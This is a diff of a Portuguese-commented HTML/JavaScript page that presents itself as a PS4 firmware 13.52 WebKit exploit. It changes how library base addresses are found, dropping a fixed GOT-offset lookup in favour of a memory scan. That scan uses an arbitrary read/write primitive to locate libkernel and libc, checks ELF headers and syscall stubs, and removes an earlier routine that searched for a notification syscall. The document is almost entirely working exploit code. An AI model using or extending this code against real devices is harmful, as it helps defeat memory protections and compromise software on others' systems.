@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — GOT Inspector)</title>
+<title>PS4 WebKit Exploit (13.52 — Memory Scan)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -24,7 +24,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
 /* console */
-#con{width:100%;max-width:720px;height:320px;background:#050508;
+#con{width:100%;max-width:720px;height:340px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
@@ -69,11 +69,11 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
   <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
-  <div class="card"><div class="cl">Status Notificação</div><div class="cv na" id="c-g">Aguardando</div></div>
+  <div class="card"><div class="cl">Status</div><div class="cv na" id="c-g">Aguardando</div></div>
 </div>
 
 <div id="cbox">
-  <div class="ct">// ═══════ PS4 FW 13.52 — GOT Inspector ═══════</div>
+  <div class="ct">// ═══════ PS4 FW 13.52 — Memory Scan Results ═══════</div>
   <div id="c-out"></div>
 </div>
 
@@ -106,78 +106,103 @@ function setCard(id, v) {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
-// RESOLUÇÃO VIA GOT — SIMPLES E RÁPIDA (offset 0x8518 confirmado no 13.52)
+// VARREDURA DE PONTEIROS NA MEMÓRIA DO WEBKIT
+// Estratégia: varrer a seção .data do WebKit procurando por ponteiros
+// que apontem para libkernel (hi=0x80) e libc (hi=0x90-0x98).
 // ═════════════════════════════════════════════════════════════════════════════
 
-const GOT_OFFSET = 0x8518;   // ← confirmado na sua foto 2! Estático no 13.52
-const GOT_ENTRIES = 64;      // ← quantas entradas ler
-const MAX_SCAN_BACK = 0x400000; // ← máximo para trás ao procurar ELF base
+async function scanForBases(p, webkitBase) {
+  logH('VARREDURA DE PONTEIROS NO WEBKIT');
 
-async function resolveViaGOT(p, webkitBase) {
-  logH('INSPECIONANDO TABELA GOT / DINÂMICA');
+  // Range de varredura: .data/.bss típica do WebKit
+  // Ajustável conforme necessário
+  const SCAN_START = 0x2800000;
+  const SCAN_END   = 0x3A00000;
+  const STEP       = 8;        // ponteiros 64-bit alinhados
+  const MAX_CANDS  = 20;       // limitar candidatos
 
-  let gotAddr = webkitBase.add32(GOT_OFFSET);
-  log('[+] DT_PLTGOT identificado no off: 0x' + GOT_OFFSET.toString(16));
+  let libkernelCands = [];
+  let libcCands = [];
+  let scanned = 0;
 
-  let libkernelCandidates = [];
-  let libcCandidates = [];
+  for (let off = SCAN_START; off < SCAN_END; off += STEP) {
+    scanned++;
 
-  // Ler entradas da GOT
-  for (let i = 0; i < GOT_ENTRIES; i++) {
+    // Log de progresso a cada 0x80000 bytes (~512KB)
+    if ((off & 0x7FFFF) === 0) {
+      let pct = Math.floor((off - SCAN_START) * 100 / (SCAN_END - SCAN_START));
+      setStatus('Varrendo memória... ' + pct + '%');
+    }
+
     try {
-      let entryAddr = gotAddr.add32(i * 8);
-      let ptr = p.read8(entryAddr);
-
-      // Validar: ponteiro não-nulo e alinhado
-      if (ptr.low === 0 && ptr.hi === 0) continue;
-      if ((ptr.low & 0x7) !== 0) continue;
-
+      let ptr = p.read8(webkitBase.add32(off));
       let hi = ptr.hi;
+      let lo = ptr.low;
 
-      // libkernel geralmente em hi=0x80
-      if (hi === 0x80) {
-        libkernelCandidates.push({idx: i, ptr, off: i * 8});
-      }
-      // libc geralmente em hi=0x90-0x98
-      else if (hi >= 0x90 && hi <= 0x98) {
-        libcCandidates.push({idx: i, ptr, off: i * 8});
-      }
+      // Pular nulos e não-alinhados
+      if (lo === 0 && hi === 0) continue;
+      if ((lo & 0x7) !== 0) continue;
 
-      // Logar primeiros 15 para debug
-      if (i < 15) {
-        log('GOT[' + i + '] -> 0x' + ptr.toString(16), 'd');
+      // libkernel: hi = 0x80
+      if (hi === 0x80 && libkernelCands.length < MAX_CANDS) {
+        // Verificar se a memória apontada é legível
+        try {
+          let testByte = p.read8(ptr); // ler 1 byte é suficiente
+          libkernelCands.push({off, ptr});
+        } catch(e) {}
+      }
+      // libc: hi = 0x90 a 0x98
+      else if (hi >= 0x90 && hi <= 0x98 && libcCands.length < MAX_CANDS) {
+        try {
+          let testByte = p.read8(ptr);
+          libcCands.push({off, ptr});
+        } catch(e) {}
       }
     } catch(e) {
-      // Memória inválida, pular
+      // Memória não mapeada, pular
     }
+
+    // Early exit se já temos candidatos suficientes
+    if (libkernelCands.length >= MAX_CANDS && libcCands.length >= MAX_CANDS) break;
   }
 
-  log('[+] ' + libkernelCandidates.length + ' candidatos libkernel (hi=0x80)');
-  log('[+] ' + libcCandidates.length + ' candidatos libc (hi=0x90-0x98)');
+  log('[+] Varredura completa: ' + scanned + ' ponteiros verificados');
+  log('[+] ' + libkernelCands.length + ' candidatos libkernel (hi=0x80)');
+  log('[+] ' + libcCands.length + ' candidatos libc (hi=0x90-0x98)');
+
+  // Logar primeiros candidatos para debug
+  for (let i = 0; i < Math.min(5, libkernelCands.length); i++) {
+    let c = libkernelCands[i];
+    log('    lk-cand[' + i + '] off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
+  }
+  for (let i = 0; i < Math.min(5, libcCands.length); i++) {
+    let c = libcCands[i];
+    log('    lc-cand[' + i + '] off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
+  }
 
   // ─── Encontrar base da libkernel ───
   let libkernelBase = null;
-  for (let cand of libkernelCandidates) {
-    let base = findElfBase(p, cand.ptr, MAX_SCAN_BACK);
+  for (let cand of libkernelCands) {
+    let base = findElfBase(p, cand.ptr, 0x400000);
     if (base) {
       libkernelBase = base;
-      log('[+] libkernel base encontrada via GOT[' + cand.idx + ']: 0x' + base.toString(16), 'ok');
+      log('[+] libkernel base: 0x' + base.toString(16) + ' (via ptr 0x' + cand.ptr.toString(16) + ')', 'ok');
       break;
     }
   }
 
   // ─── Encontrar base da libc ───
   let libcBase = null;
-  for (let cand of libcCandidates) {
-    let base = findElfBase(p, cand.ptr, MAX_SCAN_BACK);
+  for (let cand of libcCands) {
+    let base = findElfBase(p, cand.ptr, 0x400000);
     if (base) {
       libcBase = base;
-      log('[+] libc base encontrada via GOT[' + cand.idx + ']: 0x' + base.toString(16), 'ok');
+      log('[+] libc base: 0x' + base.toString(16) + ' (via ptr 0x' + cand.ptr.toString(16) + ')', 'ok');
       break;
     }
   }
 
-  return { libkernelBase, libcBase };
+  return { libkernelBase, libcBase, libkernelCands, libcCands };
 }
 
 // Varre para trás em páginas de 0x1000 procurando \x7fELF
@@ -186,7 +211,12 @@ function findElfBase(p, startPtr, maxBack) {
     try {
       let test = startPtr.sub32(back);
       if (p.read32(test) === 0x464C457F) {
-        return test;
+        // Verificar se é realmente um ELF64 válido
+        let e_class = p.read8(test.add32(4));
+        let e_machine = p.read16(test.add32(0x12));
+        if (e_class === 2 && e_machine === 0x3E) {
+          return test;
+        }
       }
     } catch(e) {}
   }
@@ -203,15 +233,18 @@ async function validateBases(p, libkernelBase, libcBase) {
 
   if (libkernelBase) {
     let magic = p.read32(libkernelBase);
-    if (magic === 0x464C457F) {
-      log('[✓] libkernel: ELF magic válido', 'ok');
+    let elfClass = p.read8(libkernelBase.add32(4));
+    let machine = p.read16(libkernelBase.add32(0x12));
+
+    if (magic === 0x464C457F && elfClass === 2 && machine === 0x3E) {
+      log('[✓] libkernel: ELF64 x86_64 válido', 'ok');
       valid.libkernel = true;
     } else {
-      log('[✗] libkernel: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
+      log('[✗] libkernel: ELF inválido (magic=0x' + magic.toString(16) + ' class=' + elfClass + ' machine=0x' + machine.toString(16) + ')', 'e');
     }
 
     let aligned = (libkernelBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libkernel: alinhada a página' : '[✗] libkernel: desalinhada', aligned ? 'ok' : 'w');
+    log(aligned ? '[✓] libkernel: alinhada a 0x1000' : '[✗] libkernel: desalinhada', aligned ? 'ok' : 'w');
     if (!aligned) valid.libkernel = false;
 
     // Procurar stubs de syscall
@@ -228,82 +261,31 @@ async function validateBases(p, libkernelBase, libcBase) {
       } catch(e) {}
     }
     if (stubs >= 3) {
-      log('[✓] libkernel: ' + stubs + ' stubs de syscall encontrados', 'ok');
+      log('[✓] libkernel: ' + stubs + ' stubs de syscall', 'ok');
     } else {
-      log('[✗] libkernel: poucos stubs (' + stubs + ')', 'w');
+      log('[✗] libkernel: apenas ' + stubs + ' stubs', 'w');
       valid.libkernel = false;
     }
   }
 
   if (libcBase) {
     let magic = p.read32(libcBase);
-    if (magic === 0x464C457F) {
-      log('[✓] libc: ELF magic válido', 'ok');
+    let elfClass = p.read8(libcBase.add32(4));
+    let machine = p.read16(libcBase.add32(0x12));
+
+    if (magic === 0x464C457F && elfClass === 2 && machine === 0x3E) {
+      log('[✓] libc: ELF64 x86_64 válido', 'ok');
       valid.libc = true;
     } else {
-      log('[✗] libc: ELF magic inválido (0x' + magic.toString(16) + ')', 'e');
+      log('[✗] libc: ELF inválido', 'e');
     }
 
     let aligned = (libcBase.low & 0xFFF) === 0;
-    log(aligned ? '[✓] libc: alinhada a página' : '[✗] libc: desalinhada', aligned ? 'ok' : 'w');
+    log(aligned ? '[✓] libc: alinhada a 0x1000' : '[✗] libc: desalinhada', aligned ? 'ok' : 'w');
     if (!aligned) valid.libc = false;
   }
 
   return valid;
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// NOTIFICAÇÃO — offset dinâmico via GOT
-// ═════════════════════════════════════════════════════════════════════════════
-
-function findNotificationOffset(p, webkitBase) {
-  logH('PROCURANDO sceKernelSendNotificationRequest');
-
-  // Varredura simples na GOT procurando por nome não é possível sem
-  // a string table. Em vez disso, vamos identificar pela assinatura
-  // do stub na libkernel.
-  //
-  // sceKernelSendNotificationRequest é syscall #600+ (varia por firmware).
-  // O stub na libkernel segue o padrão:
-  //   mov rax, <syscall#>
-  //   mov r10, rcx
-  //   syscall
-  //   ret
-  //
-  // Vamos varrer a libkernel procurando stubs e identificar pelo
-  // comportamento (número da syscall).
-
-  // MAS sem saber qual syscall é a notificação, vamos usar uma
-  // abordagem diferente: varrer a GOT e testar cada ponteiro
-  // da libkernel para ver se é a função de notificação.
-
-  // Abordagem prática: vamos usar o offset 0x8518 + índice da GOT
-  // que aponta para a libkernel e testar um por um.
-  // No PS4 9.00, o offset era 0x48B0. No 13.52, provavelmente é diferente.
-
-  // Por enquanto, vamos apenas logar os candidatos e deixar o usuário
-  // identificar qual é o correto testando.
-
-  let gotAddr = webkitBase.add32(GOT_OFFSET);
-  let candidates = [];
-
-  for (let i = 0; i < GOT_ENTRIES; i++) {
-    try {
-      let ptr = p.read8(gotAddr.add32(i * 8));
-      if (ptr.hi === 0x80 && ptr.low > 0) {
-        candidates.push({idx: i, ptr});
-      }
-    } catch(e) {}
-  }
-
-  log('[+] ' + candidates.length + ' funções da libkernel na GOT');
-  log('[!] Para identificar sceKernelSendNotificationRequest:');
-  log('    1. Use ROP ou JIT para chamar cada candidato');
-  log('    2. O que disparar notificação = correto');
-
-  // Retornar o primeiro candidato como placeholder
-  // (o usuário precisará identificar o correto)
-  return candidates.length > 0 ? candidates[0].ptr : null;
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
@@ -354,7 +336,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Mapeando bases com estabilidade...', 'r');
+  setStatus('Varrendo memória...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -377,9 +359,9 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString(16));
 
-    // ─── Resolver bases via GOT (rápido, não trava) ───
+    // ─── Varredura de ponteiros ───
     setTimeout(async () => {
-      const result = await resolveViaGOT(p, webkitBase);
+      const result = await scanForBases(p, webkitBase);
       const libKernelBase = result.libkernelBase;
       const libcBase = result.libcBase;
 
@@ -390,29 +372,37 @@ async function main() {
       const valid = await validateBases(p, libKernelBase, libcBase);
 
       if (valid.libkernel && valid.libc) {
-        log('[✓] Todas as bases validadas com sucesso!', 'ok');
-        setStatus('Endereços mapeados e validados com sucesso.', 'ok');
+        log('[✓] Todas as bases validadas!', 'ok');
+        setStatus('Bases mapeadas com sucesso', 'ok');
+        setCard('c-g', 'Pronto');
 
-        // Mostrar caixa de resultados
         const cbox = document.getElementById('cbox');
         cbox.style.display = 'block';
         document.getElementById('c-out').textContent =
-            '__ps5NativeCtor = 0x' + ctorInt64.toString(16) + '\n' +
-            'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
-            'libkernel Base  = 0x' + libKernelBase.toString(16) + '\n' +
-            'libSceLibc Base = 0x' + libcBase.toString(16) + '\n' +
-            'GOT Offset      = 0x' + GOT_OFFSET.toString(16) + '\n' +
-            'Status          = Inspeção GOT executada com sucesso.';
-
-        setCard('c-g', 'Pronto');
+            '__ps5NativeCtor  = 0x' + ctorInt64.toString(16) + '\n' +
+            'WebKit Base      = 0x' + webkitBase.toString(16) + '\n' +
+            'libkernel Base   = 0x' + libKernelBase.toString(16) + '\n' +
+            'libSceLibc Base  = 0x' + libcBase.toString(16) + '\n' +
+            'Status           = Varredura concluída com sucesso.';
       } else {
         setStatus('Validação falhou', 'e');
         setCard('c-g', 'Falha');
+
+        // Debug: mostrar candidatos mesmo se validação falhar
+        logH('CANDIDATOS PARA DEBUG');
+        log('libkernel candidatos:', 'w');
+        for (let c of result.libkernelCands.slice(0, 5)) {
+          log('  off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
+        }
+        log('libc candidatos:', 'w');
+        for (let c of result.libcCands.slice(0, 5)) {
+          log('  off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
+        }
       }
     }, 500);
 
   } else {
-    log('[-] Falha: __ps5NativeCtor não capturado.', 'e');
+    log('[-] __ps5NativeCtor não capturado.', 'e');
     setStatus('Erro ao capturar NativeCtor', 'e');
   }
 }
